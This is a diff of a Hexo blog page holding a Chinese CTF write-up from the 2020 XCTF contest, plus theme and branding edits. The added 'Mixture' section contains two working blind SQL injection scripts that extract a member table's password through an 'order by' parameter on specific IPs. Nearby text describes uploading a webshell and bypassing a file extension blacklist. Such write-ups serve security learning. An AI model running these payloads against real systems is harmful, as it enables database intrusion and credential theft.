@@ -244,7 +244,7 @@
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/godweiyang/hexo-matery-modified" class="waves-effect waves-light" target="_blank">
+            <a href="" class="waves-effect waves-light" target="_blank">
                 <i class="fa fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -300,7 +300,7 @@
     }
 </style>
 
-<a href="https://github.com/godweiyang/hexo-matery-modified" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -319,7 +319,7 @@
 <script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
     (function() {
-        let pwd = '';
+        let pwd = 'ddee63d5ca1ef22012a3bde6e7979a8a6cf1804a725a15f868e66c67b01a5c02';
         if (pwd && pwd.length > 0) {
             if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                 alert('密码错误，将返回主页！');
@@ -332,7 +332,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/8.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -376,7 +376,11 @@
     }
 
     .toc-widget {
+        width: 345px;
         padding-left: 20px;
+        background-color: rgb(255, 255, 255,0.7);
+        border-radius: 10px;
+        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
     }
 
     .toc-widget .toc-title {
@@ -449,8 +453,8 @@
                     
                     <div class="article-tag">
                         
-                        <a href="/tags/contest/" target="_blank">
-                            <span class="chip bg-color">contest</span>
+                        <a href="/tags/2020-5/" target="_blank">
+                            <span class="chip bg-color">2020-5</span>
                         </a>
                         
                     </div>
@@ -461,8 +465,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                        <a href="/categories/CTF/" class="post-category" target="_blank">
-                            CTF
+                        <a href="/categories/CTF-contest/" class="post-category" target="_blank">
+                            CTF_contest
                         </a>
                         
                     </div>
@@ -487,14 +491,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    708
+                    1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    6 分
                 </div>
                 
                 
@@ -654,6 +658,67 @@ hp <span class="token punctuation">.</span>wuwu<span aria-hidden="true" class="l
 <p><strong>思路：</strong></p>
 <p>很恶心，;都过滤了，上传一句话不可见字符webshell。</p>
 <p>文件名后缀黑名单用phtml绕过。</p>
+<h1 id="3-Mixture"><a href="#3-Mixture" class="headerlink" title="3. Mixture"></a>3. Mixture</h1><p><strong>链接：</strong></p>
+<p><strong>考点：</strong>order by sql注入</p>
+<p><strong>参考资料：</strong></p>
+<p><strong>1、</strong><a href="https://forum.90sec.com/t/topic/296" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/296</a></p>
+<p>exp：</p>
+<pre><code>import requests
+
+url = &quot;http://49.51.251.99/index.php&quot;
+data = {
+    &quot;username&quot;:&quot;xxxxx&quot;,
+    &quot;password&quot;:&quot;xxxxxxx&quot;,
+    &quot;submit&quot;:&quot;submit&quot;
+}
+cookie ={
+    &quot;PHPSESSID&quot;: &quot;sou26piclav6f99h79k1l5vmbn&quot;
+}
+requests.post(url,data=data,cookies=cookie)
+flag=&#39;&#39;
+url=&quot;http://49.51.251.99/member.php?orderby=&quot;
+for i in range(1,33):
+    for j in &#39;0123456789abcdefghijklmnopqrstuvwxyz,&#39;:
+        payload=&quot;|(mid((select password from member),{},1)=&#39;{}&#39;)%2b1&quot;.format(i,j)
+        true_url=url+payload
+        r=requests.get(true_url,cookies=cookie)
+        if r.content.index(&#39;tom&#39;)&lt;r.content.index(&#39;1000000&#39;):
+            print payload+&#39; ok&#39;
+            flag+=j
+            print flag
+            break
+        else:
+            print payload
+
+#18a960a3a0b3554b314ebe77fe545c85     </code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse
+base_url <span class="token operator">=</span> <span class="token string">'http://134.175.185.244/member.php'</span>
+url <span class="token operator">=</span> <span class="token string">'http://134.175.185.244/member.php?orderby=|{}'</span>
+
+result <span class="token operator">=</span> <span class="token string">''</span>
+cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span><span class="token string">'nit7d8990st0kdk4q5b5d91528'</span><span class="token punctuation">}</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    high <span class="token operator">=</span> <span class="token number">127</span>
+    low <span class="token operator">=</span> <span class="token number">32</span>
+    mid <span class="token operator">=</span> <span class="token punctuation">(</span>high<span class="token operator">+</span>low<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
+    <span class="token keyword">while</span> high<span class="token operator">></span>low<span class="token punctuation">:</span>
+        <span class="token comment" spellcheck="true"># payload = '(select case when (ascii(substring((select database()) from {} for 1))>{}) then 1 else 2 end)'</span>
+        <span class="token comment" spellcheck="true"># payload = '(select case when (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),{},1))>{}) then 1 else 2 end)'</span>
+        <span class="token comment" spellcheck="true"># payload = '(select case when (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 0x7573657273),{},1))>{}) then 1 else 2 end)'</span>
+        <span class="token comment" spellcheck="true"># payload = '(select case when (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 0x6d656d626572),{},1))>{}) then 1 else 2 end)'</span>
+        payload <span class="token operator">=</span> <span class="token string">'(select case when (ascii(substr((select password from member),{},1))>{}) then 1 else 2 end)'</span>
+        <span class="token comment" spellcheck="true"># 18a960a3a0b3554b314ebe77fe545c85 </span>
+        payload <span class="token operator">=</span> parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true"># print(payload.format(i,mid))</span>
+        res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
+        res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> res1<span class="token punctuation">.</span>content<span class="token operator">==</span>res2<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+            low <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            high <span class="token operator">=</span> mid
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>high<span class="token operator">+</span>low<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
+    result <span class="token operator">+=</span>chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
             </div>
             <hr />
@@ -852,9 +917,9 @@ hp <span class="token punctuation">.</span>wuwu<span aria-hidden="true" class="l
     let gitalk = new Gitalk({
         clientID: '',
         clientSecret: '',
-        repo: 'godweiyang.github.io',
-        owner: 'godweiyang',
-        admin: "godweiyang",
+        repo: 'pperk.github.io',
+        owner: '',
+        admin: "pperk",
         id: '2020/05/02/2020-xctf/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
@@ -1145,8 +1210,7 @@ hp <span class="token punctuation">.</span>wuwu<span aria-hidden="true" class="l
                 <a href="/2020/05/04/2019-redhat/">
                     <div class="card-image">
                         
-                        
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="2019--redhat">
+                        <img src="/medias/banner/1.jpg" class="responsive-img" alt="2019--redhat">
                         
                         <span class="card-title">2019--redhat</span>
                     </div>
@@ -1154,7 +1218,7 @@ hp <span class="token punctuation">.</span>wuwu<span aria-hidden="true" class="l
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            我想给你一把打开这扇门的钥匙，而你要做的便是静静的聆听接下来的故事。
                         
                     </div>
                     <div class="publish-info">
@@ -1163,8 +1227,23 @@ hp <span class="token punctuation">.</span>wuwu<span aria-hidden="true" class="l
                         </span>
                         <span class="publish-author">
                             
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF-contest/" class="post-category" target="_blank">
+                                    CTF_contest
+                                </a>
+                            
+                            
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/2019/" target="_blank">
+                        <span class="chip bg-color">2019</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -1176,20 +1255,18 @@ hp <span class="token punctuation">.</span>wuwu<span aria-hidden="true" class="l
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/05/02/ctfd-h1ve/">
+                <a href="/2020/05/02/basic-ctfd/">
                     <div class="card-image">
                         
+                        <img src="/medias/banner/10.jpg" class="responsive-img" alt="basic_ctfd">
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="ctfd-H1ve平台搭建">
-                        
-                        <span class="card-title">ctfd-H1ve平台搭建</span>
+                        <span class="card-title">basic_ctfd</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            参考资料1、一篇文章带你搭建CTF平台-基于CTFd的H1ve  https://blog.csdn.net/qq_43625917/article/details/105229456
-http://www.qwzf.top/2020/04
+                            我想给你一把打开这扇门的钥匙，而你要做的便是静静地聆听接下来的故事。
                         
                     </div>
                     <div class="publish-info">
@@ -1200,8 +1277,8 @@ http://www.qwzf.top/2020/04
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category" target="_blank">
-                                    CTF
+                            <a href="/categories/basic/" class="post-category" target="_blank">
+                                    basic
                                 </a>
                             
                             
@@ -1374,11 +1451,11 @@ http://www.qwzf.top/2020/04
     <footer class="page-footer bg-color">
     <div class="container row center-align">
         <div class="col s12 m8 l8 copy-right">
-            &copy; 2017-2020 WeiYang. 版权所有
+            &copy; 2020-2020 pperk. 版权所有
 
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">11.9k</span>
+            <span class="white-color">53.1k</span>
             
 
             <br>
@@ -1401,33 +1478,13 @@ http://www.qwzf.top/2020/04
             
         </div>
         <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/godweiyang" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
-        <i class="fa fa-github"></i>
-    </a>
 
 
 
-    <a href="mailto:godweiyang@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fa fa-envelope-open"></i>
-    </a>
 
 
 
-    <a href="https://zhihu.com/people/godweiyang" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
-        <i class="fa fa-inverse">知</i>
-    </a>
 
-
-
-    <a href="http://wpa.qq.com/msgrd?v=3&uin=792321264&site=qq&menu=yes" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
-        <i class="fa fa-qq"></i>
-    </a>
-
-
-
-    <a href="https://weibo.com/godweiyang" class="tooltipped" target="_blank" data-tooltip="关注我的微博" data-position="top" data-delay="50">
-        <i class="fa fa-weibo"></i>
-    </a>
 
 
 
@@ -1484,7 +1541,7 @@ http://www.qwzf.top/2020/04
         minutes - 0-59之间的整数，做为date对象的分钟数
         seconds - 0-59之间的整数，做为date对象的秒数
         microseconds - 0-999之间的整数，做为date对象的毫秒数 */
-        var t1 = Date.UTC(2017, 09, 11, 00, 00, 00); //北京时间2018-2-13 00:00:00
+        var t1 = Date.UTC(2020, 05, 31, 00, 00, 00); //北京时间2018-2-13 00:00:00
         var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
         var diff = t2 - t1;
         var diffYears = Math.floor(diff / years);
@@ -1557,6 +1614,8 @@ $(function () {
     
 
     <!-- 雪花特效 -->
+    
+    <script type="text/javascript" src="/libs/others/snow.js"></script>
     
 
 </body>
